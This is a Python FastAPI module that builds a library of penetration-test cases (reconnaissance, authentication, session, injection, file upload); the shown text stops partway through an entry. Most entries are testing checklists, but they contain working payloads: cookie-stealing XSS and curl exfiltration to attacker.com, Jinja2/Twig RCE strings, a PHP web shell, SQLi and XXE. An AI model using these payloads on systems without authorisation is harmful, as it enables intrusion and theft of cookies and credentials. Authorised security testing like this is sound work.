"""
Security Test Case Generator
- Standard mode: rule-based from curated 100+ case library (OWASP WSTG, PATT, pentester.land patterns)
- AI mode: Claude-powered contextual generation with SSE streaming
- Refresh mode: fetch recent CVEs from NVD and convert to test cases
"""

import json
import logging
from datetime import datetime, timezone
from typing import Annotated, AsyncGenerator

import anthropic
import httpx
from fastapi import APIRouter, Depends, HTTPException, status
from fastapi.responses import StreamingResponse
from pydantic import BaseModel

from app.core.config import get_settings
from app.core.dependencies import get_current_user, require_tool
from app.models.db.user import User
from app.api.v1.attack_patterns import (
    XSS_PAYLOADS, XSS_TEST_PARAMS, DOM_XSS_PAYLOADS, DOM_XSS_SINK_PARAMS,
    SQLI_ERROR_PAYLOADS, SQLI_TIME_PAYLOADS, SQLI_TEST_PARAMS, SQLI_ERROR_PATTERNS,
    SSRF_PARAMS, SSRF_TARGETS, SSRF_BYPASS_ENCODINGS,
    IDOR_ID_PARAMS, IDOR_ENDPOINT_PATTERNS, IDOR_REST_PATHS,
    REDIRECT_PARAMS, REDIRECT_PAYLOADS,
    SSTI_PAYLOADS, SSTI_TEST_FIELDS,
    NOSQL_INJECTION_PAYLOADS, NOSQL_URL_PAYLOADS, NOSQL_SLEEP_PAYLOADS,
    XXE_PAYLOADS, FILE_UPLOAD_PATHS, FILE_UPLOAD_BYPASS_EXTENSIONS,
    INFO_DISCLOSURE_PATHS, PRIV_ESC_PARAMS, PRIV_ESC_ADMIN_PATHS,
    MASS_ASSIGNMENT_ROLE_FIELDS, ATO_PASSWORD_RESET_TESTS, ATO_RESET_ENDPOINTS,
    WEAK_CREDENTIAL_PAIRS, JWT_WEAK_SECRETS, JWT_ALG_NONE_VARIANTS, JWT_KID_PAYLOADS,
    CSRF_BYPASS_HEADERS, CSRF_SENSITIVE_ACTIONS,
    PROTOTYPE_POLLUTION_PAYLOADS,
    BUSINESS_LOGIC_TESTS, BUSINESS_LOGIC_BASKET_ATTACKS, COUPON_CODES,
    GRAPHQL_PATHS, GRAPHQL_INTROSPECTION, GRAPHQL_AUTH_BYPASS_QUERIES,
    CACHE_POISON_HEADERS, CACHE_POISON_VALUES, RACE_CONDITION_ENDPOINTS,
    COMMON_SENSITIVE_PATHS, CORS_ATTACK_ORIGINS, CORS_SENSITIVE_PATHS,
    DESERIALIZATION_PATHS, MONITORING_PATHS,
)

logger = logging.getLogger(__name__)
settings = get_settings()

router = APIRouter(prefix="/test-generator", tags=["Test Generator"])

# ─────────────────────────────────────────────────────────────────────────────
# Test Case Library  (OWASP WSTG + PayloadsAllTheThings + pentester.land patterns)
# ─────────────────────────────────────────────────────────────────────────────

TEST_CASES: list[dict] = [

    # ── RECONNAISSANCE ────────────────────────────────────────────────────────
    {
        "id": "TC-R001", "title": "Subdomain Enumeration",
        "category": "Reconnaissance", "severity": "info",
        "description": "Discover hidden subdomains that may expose forgotten or unpatched services. Subdomains often host staging, admin, or legacy apps with weaker security.",
        "attack_pattern": "DNS brute-force combined with certificate transparency log mining.",
        "steps": [
            "Query certificate transparency logs (crt.sh, Censys) for wildcard and leaf certificates",
            "Perform DNS brute-force with common subdomain wordlists via ffuf or amass",
            "Use permutation engines (altdns, gotator) to find missed subdomains",
            "Verify live hosts via HTTP probing — httpx -l subdomains.txt -silent",
            "Screenshot all web services: gowitness scan -f live.txt",
        ],
        "expected_result": "Full map of active subdomains with IPs, hosting provider, and exposed services.",
        "cwe": "CWE-200", "owasp": None,
        "tools": {"nuclei_tags": ["dns", "subdomain-takeover"], "ffuf_wordlist": "subdomains-top1million-5000.txt"},
        "applicable_to": ["web", "api"], "tags": ["recon", "passive", "dns"],
    },
    {
        "id": "TC-R002", "title": "DNS Zone Transfer",
        "category": "Reconnaissance", "severity": "high",
        "description": "Misconfigured DNS servers may allow unauthenticated zone transfers, exposing the full internal DNS record set.",
        "attack_pattern": "Attempt AXFR/IXFR requests against all authoritative nameservers.",
        "steps": [
            "Identify authoritative nameservers: dig NS <domain>",
            "Attempt AXFR: dig axfr @<nameserver> <domain>",
            "Try all nameservers — zone transfer may be allowed on only one",
            "Parse returned records for internal hostnames, mail servers, and IPs",
        ],
        "expected_result": "Zone transfer must be denied. Success exposes full internal infrastructure map.",
        "cwe": "CWE-284", "owasp": None,
        "tools": {"nmap": ["--script dns-zone-transfer", "-p 53"], "nuclei_tags": ["dns"]},
        "applicable_to": ["web", "network"], "tags": ["recon", "dns"],
    },
    {
        "id": "TC-R003", "title": "Google Dorking / Search Engine Recon",
        "category": "Reconnaissance", "severity": "medium",
        "description": "Search engine operators reveal exposed files, login panels, and cached sensitive pages.",
        "attack_pattern": "Targeted dorks using site:, filetype:, inurl:, intitle: operators.",
        "steps": [
            "site:<target> filetype:env OR filetype:config OR filetype:sql",
            "site:<target> inurl:admin OR inurl:login OR inurl:dashboard",
            "site:<target> intitle:\"index of\" OR intitle:\"directory listing\"",
            "site:<target> inurl:backup OR inurl:old OR inurl:dev",
            "site:<target> \"internal use only\" OR \"confidential\"",
        ],
        "expected_result": "No sensitive files or internal pages indexed by search engines.",
        "cwe": "CWE-200", "owasp": "A05:2021",
        "tools": {}, "applicable_to": ["web"], "tags": ["recon", "passive", "osint"],
    },
    {
        "id": "TC-R004", "title": "Git Repository Exposure",
        "category": "Reconnaissance", "severity": "critical",
        "description": "Exposed .git directories allow full source code reconstruction including hardcoded secrets.",
        "attack_pattern": "Request /.git/HEAD — if accessible, use git-dumper to download the repository.",
        "steps": [
            "Request GET /.git/HEAD — look for 'ref: refs/heads/' response",
            "Request GET /.git/config to confirm exposure",
            "Use git-dumper to reconstruct the full repo: git-dumper http://target/.git/ ./output",
            "Search commit history: git log -p | grep -iE 'password|secret|key|token'",
            "Check .env, config.php, settings.py in history",
        ],
        "expected_result": ".git must return 403. Web server must block dotfile directories.",
        "cwe": "CWE-538", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["exposure", "git"]},
        "applicable_to": ["web"], "tags": ["exposure", "secrets", "critical"],
    },
    {
        "id": "TC-R005", "title": "Environment File Exposure (.env)",
        "category": "Reconnaissance", "severity": "critical",
        "description": "Exposed .env files contain DB credentials, API keys, JWT secrets, and cloud tokens.",
        "attack_pattern": "Request common env file paths directly.",
        "steps": [
            "GET /.env, /.env.local, /.env.production, /.env.backup",
            "GET /api/.env, /backend/.env, /app/.env",
            "Parse for DB_PASSWORD, SECRET_KEY, AWS_SECRET_ACCESS_KEY",
            "Use credentials against the app and cloud provider",
        ],
        "expected_result": "All env files must return 403/404 — never served by the web server.",
        "cwe": "CWE-538", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["exposure", "config"]},
        "applicable_to": ["web", "api"], "tags": ["exposure", "secrets", "critical"],
    },
    {
        "id": "TC-R006", "title": "Hardcoded Secrets in Public Repositories",
        "category": "Reconnaissance", "severity": "critical",
        "description": "Developers accidentally commit API keys, passwords, and tokens to public GitHub repositories.",
        "attack_pattern": "Search GitHub for target org/domain strings combined with secret keywords.",
        "steps": [
            "Search GitHub: org:<target> password OR secret OR api_key",
            "Use trufflehog: trufflehog github --org=<target> --only-verified",
            "Use gitleaks on cloned repos: gitleaks detect --source=./repo",
            "Check commit history of all repos including forks",
            "Search Pastebin and similar sites for target domain",
        ],
        "expected_result": "No secrets in any public repository. Rotate any discovered credentials immediately.",
        "cwe": "CWE-798", "owasp": "A07:2021",
        "tools": {"nuclei_tags": ["exposure", "token"]},
        "applicable_to": ["web", "api", "cloud"], "tags": ["secrets", "github", "osint"],
    },
    {
        "id": "TC-R007", "title": "ASN & IP Range Discovery",
        "category": "Reconnaissance", "severity": "info",
        "description": "Discovering an organization's full IP space via ASN lookup reveals infrastructure not linked to primary domains.",
        "attack_pattern": "Look up ASN via BGP data, then expand to full CIDR ranges.",
        "steps": [
            "Find ASN: whois <domain> | grep AS, or bgp.he.net search",
            "Get all CIDRs for ASN: whois -h whois.radb.net -- '-i origin AS<number>'",
            "Scan all IPs: nmap -sV -T4 --open <cidr>",
            "Correlate IPs to hostnames via reverse DNS",
            "Identify undiscovered assets not linked from main domain",
        ],
        "expected_result": "Full asset inventory across all owned IP ranges.",
        "cwe": "CWE-200", "owasp": None,
        "tools": {"nmap": ["-sV", "-T4", "--open"]},
        "applicable_to": ["network", "web"], "tags": ["recon", "passive", "asn"],
    },

    # ── AUTHENTICATION ────────────────────────────────────────────────────────
    {
        "id": "TC-A001", "title": "Default Credential Testing",
        "category": "Authentication", "severity": "critical",
        "description": "Services deployed with vendor default credentials are trivially compromised.",
        "attack_pattern": "Test well-known default credential pairs against all login interfaces.",
        "steps": [
            "Test: admin/admin, admin/password, root/root, admin/1234, guest/guest",
            "Test service defaults: Tomcat=tomcat/tomcat, Jenkins=admin/admin, Grafana=admin/admin",
            "Test MongoDB: mongo --host <target> (no auth)", "Test Redis: redis-cli -h <target> ping",
            "Test MySQL: mysql -u root -h <target> (no password)",
        ],
        "expected_result": "No service accepts default credentials.",
        "cwe": "CWE-1391", "owasp": "A07:2021",
        "tools": {"nuclei_tags": ["default-login", "panel"], "nmap": ["--script http-default-accounts"]},
        "applicable_to": ["web", "network", "api"], "tags": ["auth", "credentials", "critical"],
    },
    {
        "id": "TC-A002", "title": "Username Enumeration",
        "category": "Authentication", "severity": "medium",
        "description": "Different responses for valid vs. invalid usernames enable targeted attacks.",
        "attack_pattern": "Compare response content, status codes, and timing for valid vs. invalid usernames.",
        "steps": [
            "Submit login with invalid username — record response body, status, response time",
            "Submit login with valid username (admin, info@target.com) — compare response",
            "Test password reset: submit known email vs. random email — check response differences",
            "Test registration: try existing email — check if error reveals account existence",
            "Measure timing differences — valid accounts may respond faster due to bcrypt skip",
        ],
        "expected_result": "Identical response for valid and invalid usernames. Generic: 'Invalid credentials.'",
        "cwe": "CWE-204", "owasp": "A07:2021",
        "tools": {"nuclei_tags": ["exposure", "auth"]},
        "applicable_to": ["web", "api"], "tags": ["auth", "enumeration"],
    },
    {
        "id": "TC-A003", "title": "JWT Token Security",
        "category": "Authentication", "severity": "high",
        "description": "Weak JWT implementations allow algorithm confusion, 'none' bypass, or weak secret brute-forcing.",
        "attack_pattern": "Decode JWT, attempt algorithm confusion, modify claims, test with crafted tokens.",
        "steps": [
            "Decode JWT at jwt.io — identify alg, iss, exp, and custom claims",
            "Test alg=none: create token with no signature and alg='none'",
            "RS256 → HS256 confusion: sign with server's public key as HMAC secret",
            "Brute-force HS256 secret: hashcat -a 0 -m 16500 <token> wordlist.txt",
            "Modify role/admin/user_id claims and re-sign with discovered secret",
            "Test missing exp validation: submit tokens with exp=0 or past timestamp",
        ],
        "expected_result": "Only properly signed tokens accepted. alg=none rejected. Strong secret (>256 bits).",
        "cwe": "CWE-347", "owasp": "A02:2021",
        "tools": {"nuclei_tags": ["token", "auth", "jwt"]},
        "applicable_to": ["web", "api"], "tags": ["auth", "jwt", "crypto"],
    },
    {
        "id": "TC-A004", "title": "Password Reset Poisoning",
        "category": "Authentication", "severity": "high",
        "description": "Password reset flows trusting the Host header can be poisoned to capture reset tokens.",
        "attack_pattern": "Manipulate Host or X-Forwarded-Host header during password reset.",
        "steps": [
            "Trigger a password reset for a test account",
            "Intercept and replace Host header with attacker domain",
            "Also test X-Forwarded-Host, X-Host, X-Forwarded-Server headers",
            "Check if reset email contains the poisoned domain in the reset URL",
            "Verify token capture by monitoring attacker domain for incoming requests",
        ],
        "expected_result": "Reset URLs must use configured base URL, not Host header.",
        "cwe": "CWE-640", "owasp": "A03:2021",
        "tools": {"nuclei_tags": ["auth", "password-reset"]},
        "applicable_to": ["web"], "tags": ["auth", "header-injection"],
    },
    {
        "id": "TC-A005", "title": "OAuth Misconfiguration",
        "category": "Authentication", "severity": "high",
        "description": "Open redirect_uri, missing state, or implicit flow misuse leads to account takeover via token theft.",
        "attack_pattern": "Manipulate redirect_uri parameter and test state parameter entropy.",
        "steps": [
            "Test redirect_uri bypass: append /../callback, open subdomain, parameter pollution",
            "Remove state parameter and repeat flow — check if accepted",
            "Test PKCE bypass: replace code_challenge with known value",
            "Test implicit flow token leakage in referrer headers",
            "Check if authorization code can be reused after exchange",
        ],
        "expected_result": "Strict redirect_uri allowlist. Mandatory state validation. PKCE enforced.",
        "cwe": "CWE-601", "owasp": "A07:2021",
        "tools": {"nuclei_tags": ["oauth", "auth"]},
        "applicable_to": ["web", "api"], "tags": ["auth", "oauth", "account-takeover"],
    },
    {
        "id": "TC-A006", "title": "2FA / MFA Bypass",
        "category": "Authentication", "severity": "high",
        "description": "MFA implementations are often bypassable via response manipulation, code reuse, backup codes, or direct endpoint access.",
        "attack_pattern": "Test MFA verification step for logic flaws and bypass vectors.",
        "steps": [
            "After entering correct password, intercept MFA challenge response",
            "Change response status from 401 to 200 — check if access granted without code",
            "Test OTP reuse: submit same 6-digit code twice within validity window",
            "Test code brute-force: 1000000 possible 6-digit codes — check for rate limiting",
            "Test direct endpoint access: skip MFA step entirely by requesting authenticated endpoint",
            "Test backup code brute-force if backup codes are short (< 8 chars)",
            "Test recovery flow: SMS fallback — check if SMS code has weaker policy",
        ],
        "expected_result": "MFA codes are single-use, rate-limited, and cannot be bypassed via response manipulation.",
        "cwe": "CWE-287", "owasp": "A07:2021",
        "tools": {}, "applicable_to": ["web", "api"], "tags": ["auth", "mfa", "2fa", "bypass"],
    },

    # ── SESSION MANAGEMENT ────────────────────────────────────────────────────
    {
        "id": "TC-S001", "title": "Session Fixation",
        "category": "Session Management", "severity": "high",
        "description": "If the session ID is not regenerated after login, an attacker who sets a known session ID can hijack the session after the victim authenticates.",
        "attack_pattern": "Pre-set a session ID, convince a victim to authenticate, then use the same ID.",
        "steps": [
            "Request the login page — record the session cookie value",
            "Authenticate with valid credentials — compare session cookie before and after login",
            "If session ID is the same after login — the app is vulnerable to session fixation",
            "Test if you can set an arbitrary session ID via Cookie header and have it accepted",
            "Verify: use the pre-login session ID after victim logs in to access their account",
        ],
        "expected_result": "Session ID must be regenerated on every successful authentication.",
        "cwe": "CWE-384", "owasp": "A07:2021",
        "tools": {"nuclei_tags": ["session"]},
        "applicable_to": ["web"], "tags": ["session", "auth"],
    },
    {
        "id": "TC-S002", "title": "Cookie Security Attributes",
        "category": "Session Management", "severity": "medium",
        "description": "Missing Secure, HttpOnly, and SameSite cookie attributes expose sessions to theft via XSS, network interception, and CSRF.",
        "attack_pattern": "Inspect all Set-Cookie headers against security attribute checklist.",
        "steps": [
            "Log in and inspect Set-Cookie headers in the response",
            "Check for HttpOnly flag — missing = XSS can steal cookie",
            "Check for Secure flag — missing = cookie sent over HTTP",
            "Check for SameSite=Strict or Lax — missing = CSRF risk",
            "Check cookie expiry — overly long-lived session cookies increase hijack window",
            "Test if session cookie is set on root domain (leaks to all subdomains)",
        ],
        "expected_result": "All session cookies: HttpOnly; Secure; SameSite=Lax; Path=/",
        "cwe": "CWE-614", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["headers", "misconfig"]},
        "applicable_to": ["web"], "tags": ["session", "cookie"],
    },
    {
        "id": "TC-S003", "title": "Session Persistence After Logout",
        "category": "Session Management", "severity": "high",
        "description": "Sessions that remain valid after logout allow attackers with stolen tokens to maintain access.",
        "attack_pattern": "Capture session token, log out, then reuse the captured token.",
        "steps": [
            "Log in and copy session cookie / Bearer token",
            "Log out via the application's logout function",
            "Replay the copied session token on an authenticated endpoint",
            "Check if the server still accepts the old token",
            "Test token invalidation on both client and server side",
        ],
        "expected_result": "All tokens must be server-side invalidated on logout. Reused tokens must return 401.",
        "cwe": "CWE-613", "owasp": "A07:2021",
        "tools": {}, "applicable_to": ["web", "api"], "tags": ["session", "logout"],
    },

    # ── WEB APPLICATION (OWASP Top 10) ────────────────────────────────────────
    {
        "id": "TC-W001", "title": "SQL Injection",
        "category": "Web Application", "severity": "critical",
        "description": "SQL injection allows reading/modifying DB content, auth bypass, and in some cases OS command execution.",
        "attack_pattern": "Insert SQL metacharacters into all input vectors.",
        "steps": [
            "Test all fields with: ', '', ;--, ' OR '1'='1, 1' AND SLEEP(5)--",
            "Test GET/POST params, headers (User-Agent, Cookie), and JSON body fields",
            "Time-based blind: ' AND SLEEP(5)-- (MySQL), '; WAITFOR DELAY '0:0:5'-- (MSSQL)",
            "sqlmap -u \"<url>?id=1\" --level=5 --risk=3 --dbs",
            "Test second-order injection in profile fields used in later queries",
        ],
        "expected_result": "All input parameterized. No SQL errors in response. No behavioral difference on injection.",
        "cwe": "CWE-89", "owasp": "A03:2021",
        "tools": {"nuclei_tags": ["sqli", "injection"]},
        "applicable_to": ["web", "api"], "tags": ["injection", "critical", "database"],
    },
    {
        "id": "TC-W002", "title": "Reflected XSS",
        "category": "Web Application", "severity": "high",
        "description": "User input echoed in the response without encoding allows script injection in the victim's browser.",
        "attack_pattern": "Inject script payloads into URL parameters, form fields, and headers.",
        "steps": [
            "Identify reflected parameters in URLs and forms",
            "Test: <script>alert(1)</script>, <img src=x onerror=alert(1)>, javascript:alert(1)",
            "Test encoding bypasses: HTML entities, URL encoding, Unicode, case variation",
            "Test in headers: User-Agent, Referer if reflected in error pages",
            "Confirm exploitability with a URL that triggers alert when clicked",
        ],
        "expected_result": "All reflected input HTML-encoded. CSP header set.",
        "cwe": "CWE-79", "owasp": "A03:2021",
        "tools": {"nuclei_tags": ["xss"], "ffuf_wordlist": "xss.txt"},
        "applicable_to": ["web"], "tags": ["xss", "injection", "client-side"],
    },
    {
        "id": "TC-W003", "title": "Stored XSS",
        "category": "Web Application", "severity": "critical",
        "description": "Stored XSS persists in the database and fires in every victim's browser — enabling mass session hijacking.",
        "attack_pattern": "Inject script payloads into all persistent input fields.",
        "steps": [
            "Identify fields that store and later display user input (comments, profiles, names)",
            "Inject: <script>document.location='https://attacker.com/c?c='+document.cookie</script>",
            "Test rich text editors with SVG payloads and event handlers",
            "Verify the payload fires when another user (admin) views the page",
            "Test blind XSS payloads that fire in admin panels using XSS Hunter",
        ],
        "expected_result": "Stored content sanitized. CSP prevents inline script execution.",
        "cwe": "CWE-79", "owasp": "A03:2021",
        "tools": {"nuclei_tags": ["xss", "stored"]},
        "applicable_to": ["web"], "tags": ["xss", "injection", "persistent"],
    },
    {
        "id": "TC-W004", "title": "Server-Side Request Forgery (SSRF)",
        "category": "Web Application", "severity": "critical",
        "description": "SSRF lets the server fetch internal services, cloud IMDS, or arbitrary URLs — leading to credential theft.",
        "attack_pattern": "Supply attacker-controlled URLs to any server-side fetch functionality.",
        "steps": [
            "Identify URL parameters for server-side fetching (webhooks, imports, PDF generators)",
            "Test IMDS: http://169.254.169.254/latest/meta-data/ (AWS), http://metadata.google.internal/",
            "Test internal hosts: http://localhost/, http://127.0.0.1/, http://10.0.0.1/",
            "Test DNS rebinding and URL redirectors to bypass allowlists",
            "Test protocol handlers: file://, dict://, gopher://",
        ],
        "expected_result": "Outgoing requests restricted to explicit allowlist. RFC 1918 addresses blocked.",
        "cwe": "CWE-918", "owasp": "A10:2021",
        "tools": {"nuclei_tags": ["ssrf"]},
        "applicable_to": ["web", "api", "cloud"], "tags": ["ssrf", "injection", "critical"],
    },
    {
        "id": "TC-W005", "title": "XML External Entity (XXE) Injection",
        "category": "Web Application", "severity": "high",
        "description": "XML parsers with external entities enabled allow file disclosure, SSRF, and sometimes RCE.",
        "attack_pattern": "Submit crafted XML with external entity definitions to XML-parsing endpoints.",
        "steps": [
            "Identify XML-accepting endpoints (SOAP, XML API, file upload, XLSX/DOCX)",
            "Classic XXE: <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
            "Blind out-of-band: trigger DNS/HTTP to Burp Collaborator URL",
            "Test SVG uploads — SVGs are parsed XML",
            "Test XLSX/DOCX — zip archives with embedded XML",
        ],
        "expected_result": "XML parsers must disable external entity and DTD processing.",
        "cwe": "CWE-611", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["xxe"]},
        "applicable_to": ["web", "api"], "tags": ["xxe", "injection"],
    },
    {
        "id": "TC-W006", "title": "IDOR / Broken Access Control",
        "category": "Web Application", "severity": "high",
        "description": "Manipulating object IDs allows unauthorized access to other users' resources.",
        "attack_pattern": "Swap object IDs in URLs, request bodies, and headers.",
        "steps": [
            "Create two accounts (A and B). Obtain resource IDs for account A.",
            "While authenticated as B, access account A's resources by ID",
            "Test all HTTP methods: GET, PUT, DELETE, PATCH",
            "Test GUIDs — even non-sequential IDs may be guessable or leaked via other endpoints",
            "Test indirect references: filenames, email addresses used as lookup keys",
        ],
        "expected_result": "Every object access verifies ownership server-side. IDs alone don't grant access.",
        "cwe": "CWE-639", "owasp": "A01:2021",
        "tools": {}, "applicable_to": ["web", "api"], "tags": ["idor", "access-control"],
    },
    {
        "id": "TC-W007", "title": "Path Traversal / LFI",
        "category": "Web Application", "severity": "high",
        "description": "Path traversal enables reading arbitrary files. With upload, it can lead to RCE via LFI.",
        "attack_pattern": "Inject traversal sequences into file path parameters.",
        "steps": [
            "Find path params: ?file=, ?page=, ?template=, ?include=",
            "Test: ../../../../etc/passwd, ..\\..\\windows\\win.ini",
            "URL-encoded: %2e%2e%2f, double-encoded %252e%252e%2f",
            "Null byte: ../../../../etc/passwd%00.jpg",
            "On Linux: /proc/self/environ, /etc/shadow, /var/log/apache2/access.log",
        ],
        "expected_result": "File paths validated against whitelist. Absolute paths from trusted base dirs only.",
        "cwe": "CWE-22", "owasp": "A01:2021",
        "tools": {"nuclei_tags": ["lfi", "traversal"], "ffuf_wordlist": "LFI-gracefulsecurity-linux.txt"},
        "applicable_to": ["web", "api"], "tags": ["lfi", "path-traversal"],
    },
    {
        "id": "TC-W008", "title": "CSRF",
        "category": "Web Application", "severity": "medium",
        "description": "CSRF forces authenticated users to unknowingly execute state-changing actions via malicious links.",
        "attack_pattern": "Craft a forged request to a state-changing action and deliver to an authenticated user.",
        "steps": [
            "Identify state-changing actions without re-authentication",
            "Check for CSRF token — if missing, attempt the action without a token",
            "Test CSRF token validation: change it to random value, resubmit",
            "Check SameSite cookie attribute — None allows cross-origin CSRF",
            "Build PoC auto-submitting HTML form from another domain",
        ],
        "expected_result": "All state-changing requests require validated CSRF token. SameSite=Lax/Strict.",
        "cwe": "CWE-352", "owasp": "A01:2021",
        "tools": {"nuclei_tags": ["csrf"]},
        "applicable_to": ["web"], "tags": ["csrf", "client-side"],
    },
    {
        "id": "TC-W009", "title": "Open Redirect",
        "category": "Web Application", "severity": "medium",
        "description": "Open redirects enable phishing via trusted-looking URLs on the legitimate domain.",
        "attack_pattern": "Inject attacker URLs into redirect parameters.",
        "steps": [
            "Find: ?redirect=, ?next=, ?url=, ?return=, ?goto=",
            "Test: ?redirect=https://evil.com, ?redirect=//evil.com, ?redirect=/\\evil.com",
            "Test URL encoding bypasses and protocol-relative URLs",
            "Check if used in OAuth flows to steal authorization codes",
        ],
        "expected_result": "Redirects only to an internal allowlisted set of URLs.",
        "cwe": "CWE-601", "owasp": "A01:2021",
        "tools": {"nuclei_tags": ["redirect"]},
        "applicable_to": ["web", "api"], "tags": ["redirect", "phishing"],
    },
    {
        "id": "TC-W010", "title": "OS Command Injection",
        "category": "Web Application", "severity": "critical",
        "description": "Command injection allows arbitrary OS commands on the server — full system compromise.",
        "attack_pattern": "Inject OS command separators into inputs passed to shell functions.",
        "steps": [
            "Identify inputs used in system commands (ping, dig, nslookup, file converters)",
            "Test: ; whoami, | whoami, && whoami, $(whoami), `whoami`",
            "Blind: ; sleep 5 — confirm via response delay",
            "Out-of-band: ; curl https://attacker.com/$(whoami)",
            "Escalate: ; cat /etc/passwd, reverse shell payloads",
        ],
        "expected_result": "Never pass user input to shell. Use subprocess with list args. Strict validation.",
        "cwe": "CWE-78", "owasp": "A03:2021",
        "tools": {"nuclei_tags": ["rce", "injection"]},
        "applicable_to": ["web", "api", "network"], "tags": ["rce", "injection", "critical"],
    },

    # ── ADVANCED INJECTION ────────────────────────────────────────────────────
    {
        "id": "TC-INJ001", "title": "Server-Side Template Injection (SSTI)",
        "category": "Advanced Injection", "severity": "critical",
        "description": "Template injection allows code execution in template engines (Jinja2, Twig, Freemarker, Pebble).",
        "attack_pattern": "Inject template expressions into all user-controlled inputs rendered in templates.",
        "steps": [
            "Test: {{7*7}}, ${7*7}, #{7*7}, <%=7*7%> — a response containing 49 confirms injection",
            "Identify engine from error: Jinja2 (Python), Twig (PHP), Freemarker (Java), Pebble",
            "Jinja2 RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "Twig RCE: {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            "Test in email templates, PDF generators, and error messages — all render user input",
        ],
        "expected_result": "User input must never be passed to template render functions. Use logic-less templates.",
        "cwe": "CWE-94", "owasp": "A03:2021",
        "tools": {"nuclei_tags": ["ssti"]},
        "applicable_to": ["web", "api"], "tags": ["ssti", "rce", "injection", "critical"],
    },
    {
        "id": "TC-INJ002", "title": "HTTP Request Smuggling",
        "category": "Advanced Injection", "severity": "high",
        "description": "Conflicting Content-Length/Transfer-Encoding headers between front-end proxy and back-end server allow injecting requests into other users' sessions.",
        "attack_pattern": "Send ambiguous requests that front-end and back-end parse differently.",
        "steps": [
            "Identify if a reverse proxy (nginx, CDN) sits in front of the app server",
            "CL.TE: send request with both Content-Length and Transfer-Encoding headers",
            "Test payload: POST / HTTP/1.1\\r\\nHost: target\\r\\nContent-Length: 6\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nG",
            "TE.CL: reverse the priority — front-end uses TE, back-end uses CL",
            "Test TE obfuscation: Transfer-Encoding: xchunked, Transfer-Encoding:\\x09chunked",
            "Use Burp Suite's HTTP Request Smuggler extension for automated detection",
        ],
        "expected_result": "Front-end and back-end must use consistent header parsing. Normalize requests at proxy.",
        "cwe": "CWE-444", "owasp": "A03:2021",
        "tools": {"nuclei_tags": ["smuggling"]},
        "applicable_to": ["web"], "tags": ["smuggling", "http", "advanced"],
    },
    {
        "id": "TC-INJ003", "title": "NoSQL Injection",
        "category": "Advanced Injection", "severity": "high",
        "description": "MongoDB and other NoSQL databases are vulnerable to operator injection in JSON query parameters.",
        "attack_pattern": "Inject NoSQL operators into query parameters and JSON request bodies.",
        "steps": [
            "Test login: {\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}",
            "Test field extraction: {\"username\": {\"$regex\": \"^admin\"}}",
            "Test HTTP param: ?username[$ne]=invalid&password[$ne]=invalid",
            "Test $where operator injection: {\"$where\": \"this.password.length > 0\"}",
            "Blind extraction: enumerate each character with $regex and timing",
        ],
        "expected_result": "Input must be validated before use in queries. Use parameterized query APIs.",
        "cwe": "CWE-943", "owasp": "A03:2021",
        "tools": {"nuclei_tags": ["nosqli", "injection"]},
        "applicable_to": ["web", "api"], "tags": ["nosql", "injection", "database"],
    },
    {
        "id": "TC-INJ004", "title": "LDAP Injection",
        "category": "Advanced Injection", "severity": "high",
        "description": "LDAP queries built from user input allow auth bypass and directory enumeration.",
        "attack_pattern": "Inject LDAP special characters to modify query logic.",
        "steps": [
            "Test login with: *)(uid=*))(|(uid=*",
            "Test: admin)(&), admin)(|(password=*)",
            "Blind injection: inject payloads that change query behavior without error",
            "Try to enumerate all users: *)(objectClass=*)",
            "Test for LDAP injection in search and lookup fields",
        ],
        "expected_result": "Input must be escaped before inclusion in LDAP queries.",
        "cwe": "CWE-90", "owasp": "A03:2021",
        "tools": {"nuclei_tags": ["ldap"]},
        "applicable_to": ["web", "api"], "tags": ["ldap", "injection"],
    },
    {
        "id": "TC-INJ005", "title": "CRLF / HTTP Header Injection",
        "category": "Advanced Injection", "severity": "medium",
        "description": "Injecting CRLF sequences into headers allows response splitting, cache poisoning, and cookie injection.",
        "attack_pattern": "Inject %0d%0a into URL parameters or headers that are reflected in responses.",
        "steps": [
            "Test: GET /page?url=https://evil.com%0d%0aSet-Cookie:injected=1",
            "Test: GET /redirect?to=/%0d%0aContent-Length:0%0d%0a%0d%0a...",
            "Test injection in all parameters reflected in Location, Set-Cookie, or other headers",
            "Use URL-encoded variants: %0a (LF only), %0d%0a (CRLF), %E5%98%8A%E5%98%8D (Unicode)",
            "Attempt to inject a full fake HTTP response for cache poisoning",
        ],
        "expected_result": "All user input must be stripped of CR/LF characters before header inclusion.",
        "cwe": "CWE-93", "owasp": "A03:2021",
        "tools": {"nuclei_tags": ["crlf", "injection"]},
        "applicable_to": ["web"], "tags": ["crlf", "header-injection"],
    },
    {
        "id": "TC-INJ006", "title": "SMTP / Email Header Injection",
        "category": "Advanced Injection", "severity": "medium",
        "description": "User input in email fields (To, CC, Subject) allows sending spam or exfiltrating data via injected headers.",
        "attack_pattern": "Inject newlines and additional headers into email form fields.",
        "steps": [
            "Find contact forms, password reset, or notification features that send email",
            "In the 'From' or 'Subject' field, inject: test@test.com%0aCc:victim@target.com",
            "Test: test@test.com\\r\\nBcc:attacker@evil.com",
            "Verify if additional recipients receive the email",
            "Test if SMTP credentials or server details leak in error messages",
        ],
        "expected_result": "User input stripped of CR/LF before email header construction.",
        "cwe": "CWE-93", "owasp": "A03:2021",
        "tools": {}, "applicable_to": ["web"], "tags": ["smtp", "email", "injection"],
    },

    # ── FILE UPLOAD ───────────────────────────────────────────────────────────
    {
        "id": "TC-FU001", "title": "Web Shell Upload via Extension Bypass",
        "category": "File Upload", "severity": "critical",
        "description": "Insecure file upload allows uploading executable files masquerading as images — leading to RCE.",
        "attack_pattern": "Bypass MIME type and extension checks to upload server-side code.",
        "steps": [
            "Upload a PHP web shell: <?php system($_GET['cmd']); ?> as shell.php",
            "Bypass extension check: shell.php.jpg, shell.pHp, shell.php%00.jpg, shell.phtml",
            "Bypass MIME check: change Content-Type to image/jpeg while keeping .php extension",
            "Bypass magic bytes: prepend GIF89a; before PHP code",
